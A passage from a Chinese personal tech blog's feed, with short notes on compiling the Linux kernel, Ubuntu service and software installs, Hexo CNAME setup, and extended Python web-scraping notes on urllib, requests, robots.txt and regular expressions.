ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make clean</span> <br></code></pre></td></tr></table></figure><h3 id="24-2-3-开始选择内核功能"><a href="#24-2-3-开始选择内核功能" class="headerlink" title="24.2.3 开始选择内核功能"></a>24.2.3 开始选择内核功能</h3><p>内核功能的选择, 最终会在如 <code>/usr/src/kernels/linux-3.10.89/</code> 下面产生一个名为 <code>.config</code> 的隐藏文件, 这个文件就是 <code>/boot/config-xxx</code> 文件.</p><h4 id="常见的建立方法"><a href="#常见的建立方法" class="headerlink" title="常见的建立方法"></a>常见的建立方法</h4><p>几条命令, 具体见书</p><p>关于整个内核功能选择的建议:</p><ul><li>肯定内核一定要的功能, 直接编译到内核中 </li><li>可能在未来会用到, 那么尽量编译成模块</li><li>不知道功能, 保留默认值或将它编译成为模块</li></ul><h3 id="24-2-4-内核功能详细选项选择"><a href="#24-2-4-内核功能详细选项选择" class="headerlink" title="24.2.4 内核功能详细选项选择"></a>24.2.4 内核功能详细选项选择</h3><p>具体看书.</p><h2 id="24-3-内核的编译与安装"><a href="#24-3-内核的编译与安装" class="headerlink" title="24.3 内核的编译与安装"></a>24.3 内核的编译与安装</h2><p>我的 Archlinux 的内核源代码位于 <code>/lib/modules/5.19.12-arch1-1/kernel</code> 规则为: <code>/lib/modules/$(uname -r)/build</code> 及 <code>/lib/modules/$(uname -r)/source</code> 这两个链接文件.</p><p>除了 make 和 gcc 外, kernel-devel 这个软件也要安装.</p><p>需要了解到: 内核, 内核模块, 驱动程序模块, 内核源代码与头文件的相关性.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu 下查看已开启的服务</title>
    <link href="/2022/08/23/Ubuntu-%E4%B8%8B%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%BC%80%E5%90%AF%E7%9A%84%E6%9C%8D%E5%8A%A1/"/>
    <url>/2022/08/23/Ubuntu-%E4%B8%8B%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%BC%80%E5%90%AF%E7%9A%84%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>命令如下:</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">service --<span class="hljs-keyword">status</span>-<span class="hljs-built_in">all</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cpython 和 PyPy</title>
    <link href="/2022/08/23/Cpython-%E5%92%8C-PyPy/"/>
    <url>/2022/08/23/Cpython-%E5%92%8C-PyPy/</url>
    
    <content type="html"><![CDATA[<p>Cpython 和 PyPy 都是 Python 的解释器。</p><h1 id="Cpython"><a href="#Cpython" class="headerlink" title="Cpython"></a>Cpython</h1><p>Cpython 是用 C 语言写的, 是目前使用最广泛的解释器，其对于 C&#x2F;Python API 有全面的支持。但是其有全局锁的缺陷，使其性能下降。</p><h1 id="PyPy"><a href="#PyPy" class="headerlink" title="PyPy"></a>PyPy</h1><p>用 Python 实现的解释器，对 C&#x2F;Python 的缺陷有大幅提高，但是对于 C&#x2F;Python API 的支持不全。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在 hexo 中添加 CNAME 文件</title>
    <link href="/2022/08/23/%E5%9C%A8-hexo-%E4%B8%AD%E6%B7%BB%E5%8A%A0-CNAME-%E6%96%87%E4%BB%B6/"/>
    <url>/2022/08/23/%E5%9C%A8-hexo-%E4%B8%AD%E6%B7%BB%E5%8A%A0-CNAME-%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>进入博客目录, 里面的 <code>public</code> 文件夹的内容就是用于创建网站:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/Blog/public<br><span class="hljs-built_in">touch</span> CNAME<br></code></pre></td></tr></table></figure><p>然后编辑 CNAME 文件。</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu 安装 Gparted</title>
    <link href="/2022/08/23/Ubuntu-%E5%AE%89%E8%A3%85-Gparted/"/>
    <url>/2022/08/23/Ubuntu-%E5%AE%89%E8%A3%85-Gparted/</url>
    
    <content type="html"><![CDATA[<p>在命令行下载:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> gparted<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu 安装百度网盘</title>
    <link href="/2022/08/23/Ubuntu-%E5%AE%89%E8%A3%85%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/"/>
    <url>/2022/08/23/Ubuntu-%E5%AE%89%E8%A3%85%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<p>进入官网:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>pan.baidu.com/download<br></code></pre></td></tr></table></figure><p>下载 <code>deb</code> 包, 然后开始安装:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> ~/Downloads<br><span class="hljs-attribute">sudo</span> dpkg -i baidunetdisk_4.<span class="hljs-number">11</span>.<span class="hljs-number">5</span>_amd64.deb<br></code></pre></td></tr></table></figure><p>或者直接命令行下载:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> -O baidunetdisk_4.<span class="hljs-number">11</span>.<span class="hljs-number">5</span>_amd64.deb https://pan.baidu.com/download#linux/baidunetdisk_4.<span class="hljs-number">11</span>.<span class="hljs-number">5</span>_amd64.deb<br><span class="hljs-attribute">cd</span> ~/Downloads<br><span class="hljs-attribute">sudo</span> dpkg -i baidunetdisk_4.<span class="hljs-number">11</span>.<span class="hljs-number">5</span>_amd64.deb<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python Web Spider Notes</title>
    <link href="/2022/08/23/Python-Web-Spider-Notes/"/>
    <url>/2022/08/23/Python-Web-Spider-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第2章-基本库的使用"><a href="#第2章-基本库的使用" class="headerlink" title="第2章 基本库的使用"></a>第2章 基本库的使用</h1><h2 id="2-1-urllib-的使用"><a href="#2-1-urllib-的使用" class="headerlink" title="2.1 urllib 的使用"></a>2.1 urllib 的使用</h2><p><code>urllib</code> s是 Python 内置的 HTTP 请求库。</p><p>包含四个模块:</p><ul><li>request, 模拟请求的发送</li><li>error, 处理异常</li><li>parse, 提供 url 的解决方法</li><li>robotparser, 判断哪些网站可以爬</li></ul><h3 id="1-发送请求"><a href="#1-发送请求" class="headerlink" title="1 发送请求"></a>1 发送请求</h3><h4 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h4><p>如:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import urllib<span class="hljs-selector-class">.request</span><br><br>response = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(<span class="hljs-string">&#x27;https://www.python.org&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(response.read()</span></span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>可以利用 <code>type</code> 方法输出响应类型:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">print</span>(<span class="hljs-keyword">type</span>(request))<br></code></pre></td></tr></table></figure><p>利用 <code>read()</code> 方法可以获得响应的网页内容，<code>status</code> 属性可以得到响应结果的状态码。</p><p><code>urlopen</code> 方法的 API:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">urllib.request.urlopen(url, <span class="hljs-attribute">date</span>=None, [timeout,]*, <span class="hljs-attribute">cafile</span>=None, <span class="hljs-attribute">capath</span>=None, <span class="hljs-attribute">cadefault</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">context</span>=None)<br></code></pre></td></tr></table></figure><h5 id="data-参数"><a href="#data-参数" class="headerlink" title="data 参数"></a>data 参数</h5><p>使用该参数，其请求方式会变为 POST, 且需要将该参数转化为 bytes 类型:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import urllib.parse<br>import urllib.request<br><br>data = bytes(urllib.parse.urlencode(&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;germey&#x27;</span>&#125;), <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>) # 利用 urlencode 将字典转换为字符串<br>response = urllib.request.urlopen(<span class="hljs-string">&#x27;https://www.httpbin.org/post&#x27;</span>, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h5 id="timeout-参数"><a href="#timeout-参数" class="headerlink" title="timeout 参数"></a>timeout 参数</h5><p>用于设置超时时间，单位为秒。 </p><p>其支持 HTTP, HTTPS, FTP 请求。</p><p>通过 <code>try ... expect ...</code> 实现当一个网站长时间未响应就跳过对它的抓取:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import socket<br>import urllib<span class="hljs-selector-class">.request</span><br>import urllib<span class="hljs-selector-class">.error</span><br><br>try:<br>    response = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(<span class="hljs-string">&#x27;https://www.httpbin.org/get&#x27;</span>, timeout=<span class="hljs-number">0.1</span>)<br>except urllib<span class="hljs-selector-class">.erro</span><span class="hljs-selector-class">.URLError</span> as e:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(e<span class="hljs-selector-class">.reason</span>, socket.timeout):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;TIME OUT&#x27;</span>)<br></code></pre></td></tr></table></figure><p>常理来说，0.1 秒不可能得到服务器的响应。</p><h5 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h5><p>Request 是一个类，将向 urlopen 传入一个 url 改为一个对象，方便配置参数:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import urllib<span class="hljs-selector-class">.request</span><br><br>request = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.Request</span>(<span class="hljs-string">&#x27;https://python.org&#x27;</span>)<br>response = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(request)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(response.read()</span></span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utd-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>Request 类构造:</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">class</span> usrllib.request.Request(url, data=None, headers=<span class="hljs-comment">&#123;&#125;</span>, origin_req_host=None, unvarifiable=<span class="hljs-keyword">False</span>, <span class="hljs-keyword">method</span>=<span class="hljs-title function_">None</span>)<br></code></pre></td></tr></table></figure><p>添加请求头最常见的办法是通过修改 User-Agent 来伪装浏览器。</p><p>通过 <code>add_header</code> 方法添加 headers 的方式:</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">req = request(url=url, data=data, <span class="hljs-keyword">method</span>=&#x27;<span class="hljs-title function_">POST</span>&#x27;)<br><span class="hljs-title function_">req</span>.<span class="hljs-title function_">add_header</span><span class="hljs-params">(<span class="hljs-string">&#x27;User-Agent&#x27;</span>, <span class="hljs-string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>)</span><br></code></pre></td></tr></table></figure><h5 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h5><p>如 Cookie 处理、代理设置等。</p><p>使用 Handler 工具.</p><p>urllib.request 模块里的 BaseHandler 类是其他所有 Handler 类的父类。</p><p>另一个比较重要的类是 OpenerDirecctor, 简称为 Opener, 其提供 <code>open</code> 方法，该方法返回的相应类型和 urlopen 一致.</p><p>一般用 Handler 类来创建 Opener 类。</p><h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>在访问某些网站是会有认证窗口。表明其启用了基本身份认证(HTTP Basic Access Authentication).</p><p>利用 HTTPBasicAuthHandler 模块完成请求:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from urllib<span class="hljs-selector-class">.request</span> import HTTPPasswordMgrWithDefaultRealm, HTTPBasicAuthHandler, build_opener<br>from urllib<span class="hljs-selector-class">.error</span> import URLError<br><br>username = <span class="hljs-string">&#x27;admin&#x27;</span><br>password = <span class="hljs-string">&#x27;admin&#x27;</span><br>url = <span class="hljs-string">&#x27;https://ssr3.scrape.center/&#x27;</span><br><br><span class="hljs-selector-tag">p</span> = <span class="hljs-built_in">HTTPPasswordMgrWithDefaultRealm</span>()<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.add_password</span>(None, url, username, password)<br>auth_handler = <span class="hljs-built_in">HTTPBasicAuthHandler</span>(p)<br>opener = <span class="hljs-built_in">build_opener</span>(auth_handler)<br><br>try:<br>    result = opener<span class="hljs-selector-class">.open</span>(url)<br>    <span class="hljs-selector-tag">html</span> = result<span class="hljs-selector-class">.read</span>()<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(html)<br>except URLError as e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br></code></pre></td></tr></table></figure><h5 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h5><h5 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h5><h3 id="2-处理异常"><a href="#2-处理异常" class="headerlink" title="2 处理异常"></a>2 处理异常</h3><p>当出现问题时，request 模块便会抛出 error 模块中定义的异常.</p><h4 id="URLError"><a href="#URLError" class="headerlink" title="URLError"></a>URLError</h4><p>URLErrot 类来自 urllib 库中的 error 模块，继承自 OSError 类，是 error 异常模块的基类.</p><p>其有 reason 属性，返回错误原因。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request, error<br><br><span class="hljs-keyword">try</span>:<br>    response = request.urlopen(<span class="hljs-string">&#x27;https://cuiqigcai.com/404&#x27;</span>)<br>expect URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br></code></pre></td></tr></table></figure><h4 id="HTTPError"><a href="#HTTPError" class="headerlink" title="HTTPError"></a>HTTPError</h4><p>是 URLError 的子类，用于处理 HTTP 请求错误.</p><p>其有3个属性:</p><ul><li>code, 返回 HTTP 状态码</li><li>reason, 返回错误原因</li><li>headers, 返回请求头<br>因为 HTTPError 是 URLError 的子类，所以可以先捕获子类的错误再捕获父类的错误。</li></ul><h3 id="3-解析链接"><a href="#3-解析链接" class="headerlink" title="3 解析链接"></a>3 解析链接</h3><p>urllib 库中的 parse 模块，其定义了处理 URL 的标准接口.</p><h4 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h4><p>用于实现 URL 的识别和分段的方法。也就是说，一个 URL 是有很多部分组成的，这个方法可以把各个部分区分开. 其利用 URL 中特定的分隔符。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">urllib.parse</span> <span class="hljs-variable">import</span> <span class="hljs-variable">urlparse</span><br><br><span class="hljs-variable"><span class="hljs-class">result</span></span> = <span class="hljs-function"><span class="hljs-title">urlparse</span>(<span class="hljs-string">&#x27;https://www.baidu.com/index.html;user?id=comment&#x27;</span>)</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-title">type</span>(<span class="hljs-variable"><span class="hljs-class">result</span></span>))</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable"><span class="hljs-class">result</span></span>)</span><br></code></pre></td></tr></table></figure><p>一个标准的链接格式:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">scheme:<span class="hljs-regexp">//</span>netloc/path;params?query<span class="hljs-comment">#fragment</span><br></code></pre></td></tr></table></figure><p>urlparse 的 API 用法:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">urllib.parse.urlparse(urlstring, schem<span class="hljs-string">e&#x27;&#x27;</span>, allow_fragments=<span class="hljs-keyword">True</span>)<br></code></pre></td></tr></table></figure><p>三个参数:</p><ul><li>urlsring, 即 url</li><li>scheme, 填写协议，只有在 url 中不包含协议时生效</li><li>allow_fragments, 是否省略掉 fragments 部分<br>urlparse 的结果是一个元组，可以用属性名或索引来获取。</li></ul><h4 id="urlunparse"><a href="#urlunparse" class="headerlink" title="urlunparse"></a>urlunparse</h4><p>用于构造 url, 其接受的参数是一个可迭代对象，且长度为6.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from urllib import urlunparse<br><br>data = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;https&#x27;</span>, <span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>. <span class="hljs-string">&#x27;a=6&#x27;</span>, <span class="hljs-string">&#x27;comment&#x27;</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(urlunparse(data)</span></span>)<br></code></pre></td></tr></table></figure><h4 id="urlsplit"><a href="#urlsplit" class="headerlink" title="urlsplit"></a>urlsplit</h4><p>类似于 urlparse.</p><h4 id="urlunsplit"><a href="#urlunsplit" class="headerlink" title="urlunsplit"></a>urlunsplit</h4><p>类似于 urlunparse.</p><h4 id="urljoin"><a href="#urljoin" class="headerlink" title="urljoin"></a>urljoin</h4><p>可以实现链接的解析，拼合与生成。</p><h4 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h4><p>其在构造 GET 请求时非常有用, 其将字典转换为 url 参数:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from urllib import urlencode<br><br>params = &#123;<br>    <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;germey&#x27;</span>,<br>    <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">25</span><br>&#125;<br>base_url = <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span><br>url = base_url + <span class="hljs-built_in">urlencode</span>(params)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(url)</span></span><br></code></pre></td></tr></table></figure><h4 id="pase-qs"><a href="#pase-qs" class="headerlink" title="pase_qs"></a>pase_qs</h4><p>将 GET 请求参数传回字典</p><h4 id="parse-qsl"><a href="#parse-qsl" class="headerlink" title="parse_qsl"></a>parse_qsl</h4><h4 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h4><p>将内容转化为 url 编码模式。</p><h4 id="unquote"><a href="#unquote" class="headerlink" title="unquote"></a>unquote</h4><h3 id="4-分析-Robots-协议"><a href="#4-分析-Robots-协议" class="headerlink" title="4 分析 Robots 协议"></a>4 分析 Robots 协议</h3><p>使用 urllib 库中的 robotparse 模块进行分析.</p><h4 id="Robots-协议"><a href="#Robots-协议" class="headerlink" title="Robots 协议"></a>Robots 协议</h4><p>Robots 协议也称爬虫协议，全名为 Robots Exclusion Protocol, 来告诉爬虫和搜索1引擎哪些页面可以爬取。通常是一个 robots.txt 文本文件，位于网站的根目录下，</p><p>搜索爬虫在访问一个站点时，首先会检查这个站点根目录下是否存在 robots.txt 文件，若存在, 则在其定义的爬取范围内爬取。</p><p>robots.txt 样例:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">User-agent: *<br><span class="hljs-symbol">Disallow:</span> /<br><span class="hljs-symbol">Allow:</span> <span class="hljs-keyword">/public/</span><br></code></pre></td></tr></table></figure><p>其限制了只能爬取 public 目录。</p><p><code>User-agent</code> 描述了搜索爬虫的名称。</p><p><code>Disallow</code> 指定了不允许爬虫爬去的目录，<code>/</code> 表示不允许爬取所有页面.</p><p><code>Allow</code> 一般不单独使用。</p><p>允许爬虫访问所有目录的代码:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">User-agent: *</span><br><span class="hljs-section">Disallow:</span><br></code></pre></td></tr></table></figure><p>只允许某一个爬虫访问所有目录:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">User-agent: WebCrawler</span><br><span class="hljs-section">Disallow:</span><br><span class="hljs-section">User-agent: *</span><br><span class="hljs-section">Disallow: /</span><br></code></pre></td></tr></table></figure><h4 id="爬虫名称"><a href="#爬虫名称" class="headerlink" title="爬虫名称"></a>爬虫名称</h4><p>爬虫有固定名称。</p><h4 id="robotparser"><a href="#robotparser" class="headerlink" title="robotparser"></a>robotparser</h4><p>使用 robotparser 模块来解析 robots.txt 文件。</p><p>该模块提供了 RobotFileParser 类，其根据某网站的 robots.txt 文件来判断一个爬取爬虫是否有权限爬取这个网站。</p><p>RobotFileParser 类的声明:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">urllib.robotparse.RobotFileParser(<span class="hljs-attribute">url</span>=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>传入 robots.txt 文件的链接。</p><p>RobotFileParser 类的常用方法:</p><ul><li>set_url</li><li>read</li><li>parse</li><li>can_fetch</li><li>mtime</li><li>modified<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">from urllib.robotparser import RobotFileParser<br><br>rp = <span class="hljs-constructor">RobotFileParser()</span><br>rp.set<span class="hljs-constructor">_url(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">www</span>.<span class="hljs-params">baidu</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">robots</span>.<span class="hljs-params">txt</span>&#x27;)</span><br>rp.read<span class="hljs-literal">()</span><br>print(rp.can<span class="hljs-constructor">_fetch(&#x27;Baiduspider&#x27;, &#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">www</span>.<span class="hljs-params">baidu</span>.<span class="hljs-params">com</span>&#x27;)</span>)<br>print(rp.can<span class="hljs-constructor">_fetch(&#x27;Baiduspider&#x27;, &#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">www</span>.<span class="hljs-params">baidu</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">homepage</span><span class="hljs-operator">/</span>&#x27;)</span>)<br>print(rp.can<span class="hljs-constructor">_fetch(&#x27;Googlebot, &#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">www</span>.<span class="hljs-params">baidu</span>.<span class="hljs-params">com</span>&#x27;)</span>)<br></code></pre></td></tr></table></figure></li></ul><h2 id="2-2-requests-的使用"><a href="#2-2-requests-的使用" class="headerlink" title="2.2 requests 的使用"></a>2.2 requests 的使用</h2><p>requests 库用 <code>get</code> 方法请求网页。</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">import</span> requests<br><br>r = requests.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h3><p>利用 requests 库构建 GET 请求的方法.</p><h4 id="基本实例"><a href="#基本实例" class="headerlink" title="基本实例"></a>基本实例</h4><p>利用 params 参数传递信息:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">data</span> = &#123;<br>    <span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;germey&#x27;</span><br>    <span class="hljs-string">&#x27;age&#x27;</span> : <span class="hljs-number">25</span><br>&#125;<br>r = request.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;https://www.httpbin.org/get&#x27;</span>, params=<span class="hljs-keyword">data</span>)<br></code></pre></td></tr></table></figure><p>调用 json 方法可以将返回结果(JSON格式的字符串)转化为字典。</p><h4 id="抓取网页"><a href="#抓取网页" class="headerlink" title="抓取网页"></a>抓取网页</h4><h4 id="抓取二进制数据"><a href="#抓取二进制数据" class="headerlink" title="抓取二进制数据"></a>抓取二进制数据</h4><p>如抓取图片、音频、视频等文件。</p><p>Response 对象的两个属性:</p><ul><li>text, 其为 Unicode 文本</li><li>content, 其为 bytes 文本</li></ul><h4 id="添加请求头"><a href="#添加请求头" class="headerlink" title="添加请求头"></a>添加请求头</h4><h2 id="2-3-正则表达式"><a href="#2-3-正则表达式" class="headerlink" title="2.3 正则表达式"></a>2.3 正则表达式</h2><p>Python 的 re 库提供了整个正则表达式的实现.</p><h3 id="match"><a href="#match" class="headerlink" title="match"></a>match</h3><p>从字符串开头进行匹配，若开头不一致则匹配失败。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = re.match(<span class="hljs-string">&#x27;Hello&#x27;</span>, content)<br></code></pre></td></tr></table></figure><p>第一个参数为 regex, 第二个为匹配对象。</p><p>非贪婪的写法为 <code>.*?</code></p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>第三个参数为修饰符:</p><ul><li>re.I, 大小写不敏感</li><li>re.L, 本地化识别匹配</li><li>re.M, 多行匹配，影响 ^ 和 $</li><li>re.S, 